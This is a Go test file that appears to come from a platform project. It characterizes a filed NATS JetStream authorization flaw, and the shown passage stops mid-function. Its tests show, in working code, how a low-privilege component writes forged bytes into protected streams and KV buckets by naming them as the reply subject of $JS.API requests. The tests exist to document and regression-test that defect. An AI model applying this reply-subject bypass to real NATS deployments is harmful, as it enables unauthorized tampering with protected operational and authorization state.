package natsperm

// This file pins §8 of
// _bmad-output/implementation-artifacts/protected-consumer-ack-plane-denies-design.md
// — the reply-subject write primitive that every $JS.API.> holder can
// self-serve with no AllowResponses grant, plus two sharper variants found
// while pinning it: the primitive is not DIRECT.GET-specific (any $JS.API.*
// verb answers to the caller-named reply the same way), it is not even
// $JS.API-specific (an ordinary JetStream publish's PubAck is the same
// mechanism, reachable by every one of the 18 components including facet,
// which holds no $JS.API.> at all), and a stream's RePublish destination
// reaches it with no per-request reply subject at all.
//
// §8.3 explains why AllowResponses is irrelevant to any of this: a
// $JS.API.* request — and, for the PubAck/RePublish variants, an ordinary
// stream publish — is answered by the server's internal JetStream client,
// created with perms == nil (nats-server v2.14.0 server/client.go:4280-4287),
// so its publish to the destination subject is never permission-checked at
// all. isReservedReply (:4215-4226) rejects only $JS.ACK./service-reply/
// gateway prefixes on a CLIENT's chosen reply; none of that gate applies to
// a stream's own RePublish destination, which is not processed as a reply at
// all (server/stream.go's republish path sets pa.subject = dest directly).
//
// TestReplySubjectWriteAuthority, TestFacetPlainPublishLandsOnDeniedSubject,
// and the two TestStreamRepublish* tests are CHARACTERIZATION tests of a
// live, grounded, filed security defect — they are not a blessing of the
// behaviour they assert. §8.4 records, in detail, why no narrowing of this
// matrix (not CONSUMER.CREATE, not DIRECT.GET-on-the-writable-bucket, not
// content control, not a server option) closes the class, and names the
// only candidate remedy — NATS account isolation — as a platform-trust-
// topology decision for Andrew, out of scope for this package. When that fix
// lands, those tests' assertions must be INVERTED, not deleted: a failure
// there afterward means the boundary changed underneath the test, which is
// the signal to go update it, not evidence of a broken test.
//
// TestPushConsumerDeliverSubjectDoesNotReachOpsLane and
// TestPullFetchReplyDoesNotReachOpsLane pin what §8.2 actually found: a
// consumer delivery IS ingested by core-operations (the sublist match that
// decides whether the stream's own capture subscription fires is on the
// DELIVER subject, and ops.default matches its ops.> interest) — but it is
// then stored under the delivery's ORIGINAL subject, so a consumer filtered
// on the real ops lanes (what the Processor actually runs,
// internal/processor/step1_consume.go) never sees it. Both halves are
// pinned below; asserting only "core-operations captured nothing" overclaims
// what is actually contained. This is a genuinely structural containment,
// not a gap waiting to be found — it is why a CONSUMER.CREATE-shaped
// narrowing was rejected in §8.4 as buying nothing — except for the MSG.NEXT
// status/timeout frame, which carries no such original subject to fall back
// to and DOES land on the lane verbatim (its own subtest below).
//
// TestReplySubjectBypassIsNotAllowResponsesGated pins the premise §8.3 rests
// on: the four vertical apps carry AllowResponses == false, and every
// component in the matrix except facet holds a publish grant reaching
// $JS.API space — checked against the DERIVED allow list with real
// subject-wildcard matching (nats-server's own SubjectsCollide), not a
// brittle string-equality check against one particular spelling of the
// grant.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"testing"
	"time"

	"github.com/nats-io/nats-server/v2/server"
	"github.com/nats-io/nats.go/jetstream"
	"github.com/operatinggraph/lattice/internal/bootstrap"
	"github.com/operatinggraph/lattice/internal/substrate"
)

// jsAPIDirectGetHealthKV is the $JS.API.DIRECT.GET subject for the
// health-kv bucket's backing stream — the request every subtest of
// TestReplySubjectWriteAuthority sends, in one of the two wire forms
// nats-server accepts for it (§8.1's table probes both live, separately).
const jsAPIDirectGetHealthKV = "$JS.API.DIRECT.GET.KV_" + bootstrap.HealthKVBucket

// bareDirectGetRequest builds the BARE wire form: the request subject names
// no key, and the target key rides in the JSON body's last_by_subj field.
func bareDirectGetRequest(key string) (subject string, body []byte) {
	return jsAPIDirectGetHealthKV,
		[]byte(`{"last_by_subj":"$KV.` + bootstrap.HealthKVBucket + `.` + key + `"}`)
}

// subjectTokenDirectGetRequest builds the SUBJECT-TOKEN wire form: the
// target key rides in the request subject itself, and the body is empty.
func subjectTokenDirectGetRequest(key string) (subject string, body []byte) {
	return jsAPIDirectGetHealthKV + ".$KV." + bootstrap.HealthKVBucket + "." + key, nil
}

// replySubjectWireForms is the wire-form cross-product TestReplySubjectWriteAuthority
// runs against every target: a permission claim has to cover every wire form
// the server accepts, not just the one a well-behaved client library sends.
var replySubjectWireForms = []struct {
	name    string
	request func(key string) (subject string, body []byte)
}{
	{"bare", bareDirectGetRequest},
	{"subject-token", subjectTokenDirectGetRequest},
}

// writeHealthKey writes attacker-chosen bytes to clinic-app's own health-kv
// key — the SharedWrite bucket every non-bootstrap component may write, and
// the source of the forged bytes every subtest below tries to land on a
// protected target.
func writeHealthKey(t *testing.T, app *substrate.Conn, key string, payload []byte) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if _, err := app.KVPut(ctx, bootstrap.HealthKVBucket, key, payload); err != nil {
		t.Fatalf("clinic-app KVPut %s/%s: %v", bootstrap.HealthKVBucket, key, err)
	}
}

// pollForMatch polls cons until a delivered message's data satisfies match,
// or timeout elapses. It checks msgs.Error() on every iteration: Fetch's own
// return value is nil even when the underlying pull failed after the request
// was sent (consumer deleted, "no responders", a 409) — nats.go v1.52.0
// jetstream/pull.go:899-921 surfaces that only through Error(), set on the
// same fetchResult the Messages() channel drains from. Treating a nil Fetch
// error as success would let exactly that failure mode pass a positive check
// vacuously by never finding a match and just running out the clock; here it
// only adds a poll backoff, but the callers that assert absence
// (assertLaneConsumerSeesOnlyCanary) fail loudly on it instead.
func pollForMatch(t *testing.T, cons jetstream.Consumer, timeout time.Duration, match func([]byte) bool) bool {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		msgs, err := cons.Fetch(10, jetstream.FetchMaxWait(500*time.Millisecond))
		if err != nil {
			time.Sleep(50 * time.Millisecond)
			continue
		}
		found := false
		for m := range msgs.Messages() {
			_ = m.Ack()
			if match(m.Data()) {
				found = true
			}
		}
		if found {
			return true
		}
		if msgs.Error() != nil {
			time.Sleep(50 * time.Millisecond)
		}
	}
	return false
}

// pollForPayload polls cons until a delivered message's data equals want.
// Several subtests below share one fixed literal target subject (the
// vulnerable subject itself cannot be parameterized per subtest), so
// parallel subtests' consumers can all see every sibling's response;
// matching on the forged payload's own content is what keeps one subtest
// from mistaking another's message for its own.
func pollForPayload(t *testing.T, cons jetstream.Consumer, want []byte, timeout time.Duration) bool {
	t.Helper()
	return pollForMatch(t, cons, timeout, func(data []byte) bool { return bytes.Equal(data, want) })
}

// pollForSubstring is pollForPayload's relative for a response whose body is
// server-constructed (e.g. a consumer_create_response JSON envelope) rather
// than attacker-chosen verbatim bytes: it matches on a distinctive substring
// instead of exact equality.
func pollForSubstring(t *testing.T, cons jetstream.Consumer, want []byte, timeout time.Duration) bool {
	t.Helper()
	return pollForMatch(t, cons, timeout, func(data []byte) bool { return bytes.Contains(data, want) })
}

// pollForAnyMessage reports whether cons delivers anything at all within
// timeout — used where the landing under test carries no distinguishing
// content (an empty-body JetStream status frame).
func pollForAnyMessage(t *testing.T, cons jetstream.Consumer, timeout time.Duration) bool {
	t.Helper()
	return pollForMatch(t, cons, timeout, func([]byte) bool { return true })
}

// pollKVValue polls bucket/key on c until a KVGet succeeds, or timeout
// elapses, returning the stored value. The short sleep between attempts is a
// poll backoff, not the synchronization mechanism itself — the loop's exit
// condition is the KVGet succeeding.
func pollKVValue(t *testing.T, c *substrate.Conn, bucket, key string, timeout time.Duration) ([]byte, bool) {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		e, err := c.KVGet(ctx, bucket, key)
		cancel()
		if err == nil {
			return e.Value, true
		}
		time.Sleep(75 * time.Millisecond)
	}
	return nil, false
}

// pollStreamHasSubject polls streamName's own State.Subjects (queried with a
// per-subject filter, so this reads the stream's storage directly rather
// than through any consumer) until it shows at least one message stored
// under subject, or timeout elapses.
func pollStreamHasSubject(t *testing.T, boot *substrate.Conn, streamName, subject string, timeout time.Duration) bool {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		str, err := boot.JetStream().Stream(ctx, streamName)
		if err == nil {
			info, ierr := str.Info(ctx, jetstream.WithSubjectFilter(subject))
			if ierr == nil && info.State.Subjects[subject] > 0 {
				cancel()
				return true
			}
		}
		cancel()
		time.Sleep(75 * time.Millisecond)
	}
	return false
}

// TestReplySubjectWriteAuthority pins §8.1's central finding as a live vector
// against the committed deploy/nats-server.conf: as clinic-app — a component
// with no AllowResponses and no $JS.ACK.> — write forged bytes to its own
// health-kv key, then issue a $JS.API request naming a PROTECTED subject as
// the reply, and the server hands the response to that subject verbatim. No
// AllowResponses grant, no wildcard subscribe, no inbound delivery is
// involved (§8.3); the responder is the server's own internal JetStream
// client, and it is unconditional. The DIRECT.GET subtests below prove the
// core claim in both wire forms; the CONSUMER.CREATE subtest at the end
// proves the claim is about the class of $JS.API.* verbs, not one endpoint.
//
// This is a CHARACTERIZATION test of an open, grounded, filed defect, not a
// blessing of it. There is no closure available in this matrix (§8.4); the
// remedy is account isolation, Andrew's call, out of scope here. When it
// lands, these assertions must be INVERTED, not deleted — a failure here
// afterward means the boundary moved, which is the signal, not a broken
// test.
func TestReplySubjectWriteAuthority(t *testing.T) {
	t.Parallel()
	url := startServerFromConf(t)

	boot := connectAs(t, url, "bootstrap")
	provision(t, boot, bootstrap.HealthKVBucket)
	provision(t, boot, bootstrap.CoreKVBucket)
	provision(t, boot, bootstrap.CapabilityKVBucket)
	provisionStream(t, boot, bootstrap.CoreOpsStreamName, []string{bootstrap.OpsWildcardSubject})

	for _, form := range replySubjectWireForms {
		form := form

		// Target: ops.default — captured by the core-operations stream,
		// exactly the lane the vertical-app tier is denied a publish door to
		// (TestVerticalAppOpsPublishDenied). This is what makes the reply
		// subject a bypass of that denial, not just an isolated oddity.
		t.Run(form.name+"/ops.default", func(t *testing.T) {
			t.Parallel()
			app := connectAs(t, url, "clinic-app")
			key := "health.clinic-app.replysubj-ops-" + form.name
			payload := []byte("replysubj-forged-ops-" + form.name)
			writeHealthKey(t, app, key, payload)

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			cons, err := boot.JetStream().CreateOrUpdateConsumer(ctx, bootstrap.CoreOpsStreamName, jetstream.ConsumerConfig{
				Durable:       "replysubj-ops-" + form.name,
				FilterSubject: bootstrap.OpsWildcardSubject,
			})
			if err != nil {
				t.Fatalf("watch consumer on %s: %v", bootstrap.CoreOpsStreamName, err)
			}

			subject, body := form.request(key)
			if err := app.NATS().PublishRequest(subject, "ops.default", body); err != nil {
				t.Fatalf("clinic-app DIRECT.GET (%s) reply=ops.default: %v", form.name, err)
			}
			if err := app.NATS().Flush(); err != nil {
				t.Fatalf("flush: %v", err)
			}

			if !pollForPayload(t, cons, payload, 8*time.Second) {
				t.Fatalf("core-operations never captured the %s DIRECT.GET response — want the forged health-kv bytes landing on ops.default (§8.1)", form.name)
			}
		})

		// Target: $KV.core-kv.<key> — the sole-writer (processor) bucket
		// TestCoreKVWriteIsolation pins every other component out of at the
		// transport layer. The reply-subject route reaches it anyway.
		t.Run(form.name+"/core-kv", func(t *testing.T) {
			t.Parallel()
			app := connectAs(t, url, "clinic-app")
			key := "health.clinic-app.replysubj-corekv-" + form.name
			target := "vtx.probe.replysubj-corekv-" + form.name
			payload := []byte("replysubj-forged-corekv-" + form.name)
			writeHealthKey(t, app, key, payload)

			subject, body := form.request(key)
			if err := app.NATS().PublishRequest(subject, "$KV."+bootstrap.CoreKVBucket+"."+target, body); err != nil {
				t.Fatalf("clinic-app DIRECT.GET (%s) reply=$KV.%s.%s: %v", form.name, bootstrap.CoreKVBucket, target, err)
			}
			if err := app.NATS().Flush(); err != nil {
				t.Fatalf("flush: %v", err)
			}

			got, ok := pollKVValue(t, boot, bootstrap.CoreKVBucket, target, 8*time.Second)
			if !ok {
				t.Fatalf("%s key %q was never written — want the forged health-kv bytes landing there (§8.1)", bootstrap.CoreKVBucket, target)
			}
			if !bytes.Equal(got, payload) {
				t.Errorf("%s key %q = %q, want the forged bytes %q", bootstrap.CoreKVBucket, target, got, payload)
			}
		})

		// Target: $KV.capability-kv.<key> — the auth-plane projection whose
		// registry-derived Deny() denies every non-owner component's direct
		// publish (refractor is the sole owner). The reply-subject route
		// reaches it too: this is not scoped to Core state.
		t.Run(form.name+"/capability-kv", func(t *testing.T) {
			t.Parallel()
			app := connectAs(t, url, "clinic-app")
			key := "health.clinic-app.replysubj-capkv-" + form.name
			target := "cap.probe.replysubj-" + form.name
			payload := []byte("replysubj-forged-capkv-" + form.name)
			writeHealthKey(t, app, key, payload)

			subject, body := form.request(key)
			if err := app.NATS().PublishRequest(subject, "$KV."+bootstrap.CapabilityKVBucket+"."+target, body); err != nil {
				t.Fatalf("clinic-app DIRECT.GET (%s) reply=$KV.%s.%s: %v", form.name, bootstrap.CapabilityKVBucket, target, err)
			}
			if err := app.NATS().Flush(); err != nil {
				t.Fatalf("flush: %v", err)
			}

			got, ok := pollKVValue(t, boot, bootstrap.CapabilityKVBucket, target, 8*time.Second)
			if !ok {
				t.Fatalf("%s key %q was never written — want the forged health-kv bytes landing there (§8.1)", bootstrap.CapabilityKVBucket, target)
			}
			if !bytes.Equal(got, payload) {
				t.Errorf("%s key %q = %q, want the forged bytes %q", bootstrap.CapabilityKVBucket, target, got, payload)
			}
		})
	}

	// The primitive is not DIRECT.GET-specific: any $JS.API.* verb answers
	// to the caller-named reply subject the same way. Pin one more verb —
	// CONSUMER.CREATE — so the claim above is made at the CLASS level.
	// Without this, a future DIRECT.GET-specific deny would turn every
	// subtest above red and read as "the boundary moved, go invert", while
	// every other $JS.API verb stayed just as exposed.
	t.Run("consumer-create/ops.default", func(t *testing.T) {
		t.Parallel()
		app := connectAs(t, url, "clinic-app")

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		cons, err := boot.JetStream().CreateOrUpdateConsumer(ctx, bootstrap.CoreOpsStreamName, jetstream.ConsumerConfig{
			Durable:       "replysubj-consumer-create",
			FilterSubject: bootstrap.OpsWildcardSubject,
		})
		if err != nil {
			t.Fatalf("watch consumer on %s: %v", bootstrap.CoreOpsStreamName, err)
		}

		const consumerName = "replysubj-verb-probe"
		createReq := fmt.Sprintf(
			`{"stream_name":"KV_%s","config":{"name":%q,"ack_policy":"none","filter_subject":"$KV.%s.health.clinic-app.replysubj-verb-probe"}}`,
			bootstrap.HealthKVBucket, consumerName, bootstrap.HealthKVBucket,
		)
		if err := app.NATS().PublishRequest("$JS.API.CONSUMER.CREATE.KV_"+bootstrap.HealthKVBucket+"."+consumerName, "ops.default", []byte(createReq)); err != nil {
			t.Fatalf("clinic-app CONSUMER.CREATE reply=ops.default: %v", err)
		}
		if err := app.NATS().Flush(); err != nil {
			t.Fatalf("flush: %v", err)
		}

		want := []byte(`"name":"` + consumerName + `"`)
		if !pollForSubstring(t, cons, want, 8*time.Second) {
			t.Fatalf("core-operations never captured the CONSUMER.CREATE response — want the consumer_create_response JSON (naming %q) landing on ops.default (§8, class-level claim)", consumerName)
		}
	})
}

// replySubjectSettleWindow bounds every negative assertion below. A single
// Fetch(10, FetchMaxWait(replySubjectSettleWindow)) call blocks until either
// 10 messages have arrived or the window elapses, whichever comes first
// (nats.go v1.52.0 jetstream/pull.go:966-990) — with a batch of 10 against a
// scenario that produces at most one or two messages, that means it runs the
// FULL window in practice (measured: 2.00s), which is exactly the "sit out
// one bounded window" a negative needs — no time.Sleep required to get it.
const replySubjectSettleWindow = 2 * time.Second

// assertLaneConsumerSeesOnlyCanary is the negative half of both consumer-
// route containment tests, and proves two things or it is vacuous:
//
//  1. During the settling window, the ops-lane-filtered consumer received
//     none of the forged bytes — checked via both Messages() and Error(),
//     because nats.go surfaces a fetch-time failure (consumer deleted, "no
//     responders", a missed heartbeat) ONLY through the latter; Fetch's own
//     return error stays nil, so skipping Error() lets exactly that failure
//     mode pass as an empty, "nothing arrived" result.
//  2. The observer is actually alive: after the window, bootstrap — which
//     holds ops.> — publishes a real, distinguishable canary directly to the
//     same lane, and this SAME consumer must receive it. An empty result in
//     step 1 from a silently dead consumer would otherwise look identical to
//     genuine containment.
func assertLaneConsumerSeesOnlyCanary(t *testing.T, boot *substrate.Conn, cons jetstream.Consumer, forgedPayload []byte, label string) {
	t.Helper()

	msgs, err := cons.Fetch(10, jetstream.FetchMaxWait(replySubjectSettleWindow))
	if err != nil {
		t.Fatalf("%s: Fetch: %v", label, err)
	}
	var seen [][]byte
	for m := range msgs.Messages() {
		seen = append(seen, append([]byte(nil), m.Data()...))
		_ = m.Ack()
	}
	if ferr := msgs.Error(); ferr != nil {
		t.Fatalf("%s: Fetch reported %v after the settling window — the observer consumer is not usable, so the absence above proves nothing", label, ferr)
	}
	for _, data := range seen {
		if bytes.Equal(data, forgedPayload) {
			t.Fatalf("%s: the ops-lane consumer received the forged delivery — containment is broken", label)
		}
	}

	canary := []byte("replysubj-canary-" + label)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := boot.Publish(ctx, "ops.default", canary, nil); err != nil {
		t.Fatalf("%s: bootstrap Publish canary to ops.default: %v", label, err)
	}
	if !pollForPayload(t, cons, canary, 8*time.Second) {
		t.Fatalf("%s: ops-lane consumer never received its own liveness canary — the negative check above is not trustworthy", label)
	}
}

// TestPushConsumerDeliverSubjectDoesNotReachOpsLane pins §8.2's actual
// (narrower than first stated) contained route: as clinic-app, create a push
// consumer on KV_health-kv (filtered to its own key) with
// DeliverSubject: ops.default, via a raw $JS.API.CONSUMER.CREATE request
// with hand-built JSON — not the client library, because the library is not
// the attacker's constraint.
//
// Two things are true at once here, and both are pinned: core-operations
// DOES ingest the delivery (the deliver subject ops.default matches its
// ops.> sublist interest, so the stream's own capture subscription fires),
// but it stores the message under the delivery's ORIGINAL subject
// ($KV.health-kv.…) rather than ops.default — so a consumer filtered on the
// real ops lanes (what the Processor actually runs) never sees it. Asserting
// only the second half, without the first, overclaims what containment
// means here.
//
// Not expected to ever invert: §8.2 is why a CONSUMER.CREATE-shaped
// narrowing was rejected in §8.4 as buying nothing — the lane-consumer
// containment here is structural, not a gap waiting to be found. A failure
// would mean the routing/subject-storage mechanics changed, which is worth
// knowing regardless.
func TestPushConsumerDeliverSubjectDoesNotReachOpsLane(t *testing.T) {
	t.Parallel()
	url := startServerFromConf(t)

	boot := connectAs(t, url, "bootstrap")
	provision(t, boot, bootstrap.HealthKVBucket)
	provisionStream(t, boot, bootstrap.CoreOpsStreamName, []string{bootstrap.OpsWildcardSubject})

	app := connectAs(t, url, "clinic-app")
	key := "health.clinic-app.push-deliver-probe"
	origSubject := "$KV." + bootstrap.HealthKVBucket + "." + key
	payload := []byte("push-deliver-payload")
	writeHealthKey(t, app, key, payload)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	laneWatch, err := boot.JetStream().CreateOrUpdateConsumer(ctx, bootstrap.CoreOpsStreamName, jetstream.ConsumerConfig{
		Durable:       "replysubj-push-lane",
		FilterSubject: "ops.default",
	})
	if err != nil {
		t.Fatalf("watch consumer on %s: %v", bootstrap.CoreOpsStreamName, err)
	}

	// Subscribe to the deliver subject before creating the push consumer, so
	// the delivery has an interested subscriber to land on (the positive
	// control that the vector reaches the mechanism at all).
	sub, err := app.NATS().SubscribeSync("ops.default")
	if err != nil {
		t.Fatalf("clinic-app subscribe ops.default: %v", err)
	}
	t.Cleanup(func() { _ = sub.Unsubscribe() })
	if err := app.NATS().Flush(); err != nil {
		t.Fatalf("flush: %v", err)
	}

	createReq := fmt.Sprintf(
		`{"stream_name":"KV_%s","config":{"name":"replysubj-push","deliver_subject":"ops.default","filter_subject":%q,"deliver_policy":"all","ack_policy":"none","replay_policy":"instant"}}`,
		bootstrap.HealthKVBucket, origSubject,
	)
	if _, err := app.NATS().Request("$JS.API.CONSUMER.CREATE.KV_"+bootstrap.HealthKVBucket+".replysubj-push", []byte(createReq), 5*time.Second); err != nil {
		t.Fatalf("clinic-app raw CONSUMER.CREATE (push, DeliverSubject=ops.default): %v", err)
	}

	msg, err := sub.NextMsg(8 * time.Second)
	if err != nil {
		t.Fatalf("clinic-app subscriber on ops.default: want the push delivery, got %v", err)
	}
	if msg.Subject != origSubject {
		t.Errorf("delivered message Subject = %q, want the original %q", msg.Subject, origSubject)
	}

	if !pollStreamHasSubject(t, boot, bootstrap.CoreOpsStreamName, origSubject, 8*time.Second) {
		t.Fatalf("core-operations stream state never showed a message stored under %q — want the delivery ingested there even though no ops-lane consumer will ever see it (nats-server v2.14.0 server/client.go:5088-5092, server/stream.go:8058-8060)", origSubject)
	}

	assertLaneConsumerSeesOnlyCanary(t, boot, laneWatch, payload, "push-consumer DeliverSubject=ops.default")
}

// TestPullFetchReplyDoesNotReachOpsLane covers the pull-consumer half of
// §8.1's table. Two subtests, because the two are genuinely different
// claims: "data-path" is TestPushConsumerDeliverSubjectDoesNotReachOpsLane's
// pull-consumer twin (the delivered message's ORIGINAL subject is preserved,
// so it never reaches a lane-filtered consumer, even though core-operations
// does ingest it); "status-frame" is the opposite finding for the SAME
// MSG.NEXT mechanism — when there is no message to deliver, the reply is a
// JetStream STATUS/timeout frame, which is an ordinary server publish with
// no original subject to fall back to, and it DOES land on the lane
// verbatim. Only "data-path" is expected to hold when the remedy lands;
// "status-frame" is a permanent, unrelated fact about status replies and
// does not get inverted.
func TestPullFetchReplyDoesNotReachOpsLane(t *testing.T) {
	t.Parallel()
	url := startServerFromConf(t)

	boot := connectAs(t, url, "bootstrap")
	provision(t, boot, bootstrap.HealthKVBucket)
	provisionStream(t, boot, bootstrap.CoreOpsStreamName, []string{bootstrap.OpsWildcardSubject})

	t.Run("data-path", func(t *testing.T) {
		app := connectAs(t, url, "clinic-app")
		key := "health.clinic-app.pull-fetch-probe"
		origSubject := "$KV." + bootstrap.HealthKVBucket + "." + key
		payload := []byte("pull-fetch-payload")
		writeHealthKey(t, app, key, payload)

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		laneWatch, err := boot.JetStream().CreateOrUpdateConsumer(ctx, bootstrap.CoreOpsStreamName, jetstream.ConsumerConfig{
			Durable:       "replysubj-pull-lane",
			FilterSubject: "ops.default",
		})
		if err != nil {
			t.Fatalf("watch consumer on %s: %v", bootstrap.CoreOpsStreamName, err)
		}

		createReq := fmt.Sprintf(
			`{"stream_name":"KV_%s","config":{"name":"replysubj-pull","filter_subject":%q,"deliver_policy":"all","ack_policy":"none","replay_policy":"instant"}}`,
			bootstrap.HealthKVBucket, origSubject,
		)
		if _, err := app.NATS().Request("$JS.API.CONSUMER.CREATE.KV_"+bootstrap.HealthKVBucket+".replysubj-pull", []byte(createReq), 5*time.Second); err != nil {
			t.Fatalf("clinic-app raw CONSUMER.CREATE (pull): %v", err)
		}

		sub, err := app.NATS().SubscribeSync("ops.default")
		if err != nil {
			t.Fatalf("clinic-app subscribe ops.default: %v", err)
		}
		t.Cleanup(func() { _ = sub.Unsubscribe() })
		if err := app.NATS().Flush(); err != nil {
			t.Fatalf("flush: %v", err)
		}

		// A generous expiry: the message is already pending at consumer
		// creation time (DeliverPolicy "all"), so this normally answers
		// near-instantly, but a short fixed window can still lose the race
		// under CI load and misread as containment breaking rather than as
		// scheduling jitter — the delivery path itself must not depend on
		// the window being tight.
		if err := app.NATS().PublishRequest(
			"$JS.API.CONSUMER.MSG.NEXT.KV_"+bootstrap.HealthKVBucket+".replysubj-pull",
			"ops.default", []byte(`{"batch":1,"expires":10000000000}`)); err != nil {
			t.Fatalf("clinic-app MSG.NEXT reply=ops.default: %v", err)
		}

		msg, err := sub.NextMsg(12 * time.Second)
		if err != nil {
			t.Fatalf("clinic-app subscriber on ops.default: want the pull delivery, got %v", err)
		}
		if msg.Subject != origSubject {
			t.Errorf("delivered message Subject = %q, want the original %q", msg.Subject, origSubject)
		}

		if !pollStreamHasSubject(t, boot, bootstrap.CoreOpsStreamName, origSubject, 8*time.Second) {
			t.Fatalf("core-operations stream state never showed a message stored under %q", origSubject)
		}
		assertLaneConsumerSeesOnlyCanary(t, boot, laneWatch, payload, "pull-consumer MSG.NEXT reply=ops.default (data path)")
	})

	t.Run("status-frame", func(t *testing.T) {
		app := connectAs(t, url, "clinic-app")
		// A key nothing ever publishes to: this consumer is structurally
		// always empty, so MSG.NEXT can only ever answer with a JetStream
		// STATUS frame, never real data.
		emptyFilter := "$KV." + bootstrap.HealthKVBucket + ".health.clinic-app.pull-status-frame-never-published"

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		laneWatch, err := boot.JetStream().CreateOrUpdateConsumer(ctx, bootstrap.CoreOpsStreamName, jetstream.ConsumerConfig{
			Durable:       "replysubj-pull-status-lane",
			FilterSubject: "ops.default",
		})
		if err != nil {
			t.Fatalf("watch consumer on %s: %v", bootstrap.CoreOpsStreamName, err)
		}

		createReq := fmt.Sprintf(
			`{"stream_name":"KV_%s","config":{"name":"replysubj-pull-status","filter_subject":%q,"deliver_policy":"all","ack_policy":"none","replay_policy":"instant"}}`,
			bootstrap.HealthKVBucket, emptyFilter,
		)
		if _, err := app.NATS().Request("$JS.API.CONSUMER.CREATE.KV_"+bootstrap.HealthKVBucket+".replysubj-pull-status", []byte(createReq), 5*time.Second); err != nil {
			t.Fatalf("clinic-app raw CONSUMER.CREATE (pull, empty filter): %v", err)
		}

		if err := app.NATS().PublishRequest(
			"$JS.API.CONSUMER.MSG.NEXT.KV_"+bootstrap.HealthKVBucket+".replysubj-pull-status",
			"ops.default", []byte(`{"batch":1,"no_wait":true}`)); err != nil {
			t.Fatalf("clinic-app MSG.NEXT reply=ops.default: %v", err)
		}

		// Unlike the data path, this IS a genuine landing: with nothing
		// pending, the reply is a status/timeout frame — an ordinary server
		// publish straight to the named subject, with no original subject to
		// fall back to. The body carries no distinguishing content, so this
		// polls for ANY message rather than a specific payload.
		if !pollForAnyMessage(t, laneWatch, 8*time.Second) {
			t.Fatal("core-operations never captured the MSG.NEXT status frame on ops.default — want the empty-pending status reply landing there verbatim (§8: this half of the pull route is NOT contained)")
		}
	})
}

// jsAPIGrantExemplar is the literal subject TestReplySubjectBypassIsNotAllowResponsesGated
// tests every component's derived Allow() list against: the exact request
// subject TestReplySubjectWriteAuthority uses. server.SubjectsCollide does
// real subject-wildcard matching (nats-server v2.14.0 server/sublist.go:1338),
// so a grant spelled as "$JS.API.>", "$JS.API.DIRECT.>", "$JS.API.*.*", or
// even the universal ">" all correctly register as reaching it — a plain
// string-equality check against one literal spelling of the grant would miss
// every one of those.
const jsAPIGrantExemplar = "$JS.API.DIRECT.GET.KV_" + bootstrap.HealthKVBucket

// holdsJSAPIGrant reports whether allow authorizes a publish to
// jsAPIGrantExemplar under real NATS subject-matching rules.
func holdsJSAPIGrant(allow []string) bool {
	for _, s := range allow {
		if server.SubjectsCollide(s, jsAPIGrantExemplar) {
			return true
		}
	}
	return false
}

// jsAPIGrantRoster is TestReplySubjectBypassIsNotAllowResponsesGated's
// two-way oracle, in ackGrantRoster's style (conf_test.go): every component
// must declare whether its derived Allow() list reaches $JS.API space, so a
// newly added component is forced to take a side rather than silently
// inheriting whichever default the loop happens to assume.
var jsAPIGrantRoster = map[string]bool{
	"processor":            true,
	"refractor":            true,
	"loom":                 true,
	"weaver":               true,
	"bridge":               true,
	"object-store-manager": true,
	"chronicler":           true,
	"model-runner":         true,
	"bootstrap":            true,
	"lattice-pkg":          true,
	"loupe":                true,
	"lattice":              true,
	"gateway":              true,
	"loftspace-app":        true,
	"clinic-app":           true,
	"cafe-app":             true,
	"wellness-app":         true,
	"facet":                false,
}

// TestReplySubjectBypassIsNotAllowResponsesGated pins the two premises §8.3
// rests on, in TestAckGrantRoster's roster-pinning style.
//
// (a) TestReplySubjectWriteAuthority's claim that the reply-subject route
// needs no AllowResponses grant holds only while every vertical app actually
// carries AllowResponses == false.
//
// (b) §8.3's claim that facet is the sole contained component holds only
// while facet is also the ONLY component in the matrix with no path into
// $JS.API space — checked both ways, exhaustively, against the derived
// Allow() list with real subject matching (jsAPIGrantRoster/holdsJSAPIGrant)
// rather than a string-equality check on the raw ExtraPubAllow literal,
// which a re-spelled grant ("$JS.API.DIRECT.>", ">", …) would sail past
// undetected.
//
// This is a premise pin, not a characterization of the defect itself: it
// does not need to be inverted alongside TestReplySubjectWriteAuthority when
// the remedy lands. If either premise silently changes, this fails loudly
// instead of letting the claims above rot.
func TestReplySubjectBypassIsNotAllowResponsesGated(t *testing.T) {
	t.Parallel()
	buckets := bootstrap.PlatformBuckets()

	if len(verticalAppNames) == 0 {
		t.Fatal("verticalAppNames is empty — the AllowResponses loop below would pass vacuously")
	}
	isVerticalApp := make(map[string]bool, len(verticalAppNames))
	for _, name := range verticalAppNames {
		isVerticalApp[name] = true
	}

	seenApp := make(map[string]bool, len(verticalAppNames))
	seenRoster := make(map[string]bool, len(jsAPIGrantRoster))
	for _, c := range Matrix {
		c := c
		if isVerticalApp[c.Name] {
			seenApp[c.Name] = true
			if c.AllowResponses {
				t.Errorf("%s: AllowResponses = true, want false — TestReplySubjectWriteAuthority's \"no flag needed\" claim (§8.3) holds only while every vertical app carries AllowResponses=false", c.Name)
			}
		}

		want, listed := jsAPIGrantRoster[c.Name]
		if !listed {
			t.Errorf("component %q is not in jsAPIGrantRoster — decide whether it holds a path into $JS.API space and record the reason there", c.Name)
			continue
		}
		seenRoster[c.Name] = true
		if got := holdsJSAPIGrant(c.Allow(buckets)); got != want {
			t.Errorf("%s holds a $JS.API-reaching grant = %v, want %v — §8.3 records facet as the sole exception; if this component's posture changed, the remedy shape recorded in §8.4 needs re-deriving", c.Name, got, want)
		}
	}
	for _, name := range verticalAppNames {
		if !seenApp[name] {
